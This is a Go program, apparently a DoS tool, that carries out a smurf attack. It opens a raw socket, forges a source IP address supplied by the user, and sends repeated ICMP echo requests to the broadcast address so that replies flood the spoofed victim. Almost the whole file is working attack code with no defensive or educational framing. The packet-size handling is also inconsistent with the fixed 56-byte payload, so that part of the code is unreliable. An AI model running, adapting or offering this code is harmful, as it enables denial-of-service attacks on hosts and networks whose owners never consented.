// env team
// unix support ++
package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"golang.org/x/sys/unix"
)

type icmpPacket struct {
	Type     uint8
	Code     uint8
	Checksum uint16
	ID       uint16
	Seq      uint16
	Data     [56]byte
}

type ipHeader struct {
	VersionIHL  uint8
	TOS         uint8
	Length      uint16
	ID          uint16
	FlagsFrag   uint16
	TTL         uint8
	Protocol    uint8
	Checksum    uint16
	SrcIP       [4]byte
	DstIP       [4]byte
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func smurfAttack(sourceIP string, packetSize int, numRequests int) {
	// unix support
	rawSocket, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_ICMP)
	if err != nil {
		log.Fatalf("Failed to create raw socket: %v", err)
	}
	defer unix.Close(rawSocket)

	err = unix.SetsockoptInt(rawSocket, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
	if err != nil {
		log.Fatalf("Failed to set IP_HDRINCL: %v", err)
	}

	srcIP := net.ParseIP(sourceIP).To4()
	destIP := net.ParseIP("255.255.255.255").To4()

	rand.Seed(time.Now().UnixNano())
	for i := 0; i < numRequests; i++ {
		ip := ipHeader{
			VersionIHL:  0x45,
			TOS:         0,
			Length:      uint16(20 + 8 + packetSize),
			ID:          uint16(rand.Intn(65535)),
			FlagsFrag:   0,
			TTL:         64,
			Protocol:    unix.IPPROTO_ICMP,
			SrcIP:       [4]byte{srcIP[0], srcIP[1], srcIP[2], srcIP[3]},
			DstIP:       [4]byte{destIP[0], destIP[1], destIP[2], destIP[3]},
		}

		icmp := icmpPacket{
			Type: 8, 
			Code: 0,
			ID:   uint16(rand.Intn(65535)),
			Seq:  uint16(i),
		}
		randomData := make([]byte, packetSize)
		rand.Read(randomData)
		copy(icmp.Data[:], randomData[:])

		ipBuf := new(bytes.Buffer)
		binary.Write(ipBuf, binary.BigEndian, ip)
		ip.Checksum = checksum(ipBuf.Bytes())
		ipBuf.Reset()
		binary.Write(ipBuf, binary.BigEndian, ip)

		icmpBuf := new(bytes.Buffer)
		binary.Write(icmpBuf, binary.BigEndian, icmp)
		icmp.Checksum = checksum(icmpBuf.Bytes())
		icmpBuf.Reset()
		binary.Write(icmpBuf, binary.BigEndian, icmp)

		packet := append(ipBuf.Bytes(), icmpBuf.Bytes()...)
		addr := unix.SockaddrInet4{Port: 0, Addr: [4]byte{destIP[0], destIP[1], destIP[2], destIP[3]}}

		err := unix.Sendto(rawSocket, packet, 0, &addr)
		if err != nil {
			log.Printf("Failed to send packet: %v", err)
		}
		fmt.Println("Sent smurf packet.")

		time.Sleep(100 * time.Millisecond)
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("src ip: ")
	sourceIP, _ := reader.ReadString('\n')
	sourceIP = strings.TrimSpace(sourceIP)

	fmt.Print("packet size: ")
	packetSizeStr, _ := reader.ReadString('\n')
	packetSize, err := strconv.Atoi(strings.TrimSpace(packetSizeStr))
	if err != nil || packetSize <= 0 {
		log.Fatalf("Invalid packet size: %v", err)
	}

	fmt.Print("num. of requests: ")
	numRequestsStr, _ := reader.ReadString('\n')
	numRequests, err := strconv.Atoi(strings.TrimSpace(numRequestsStr))
	if err != nil || numRequests <= 0 {
		log.Fatalf("invalid req. num.: %v", err)
	}

	smurfAttack(sourceIP, packetSize, numRequests)
}
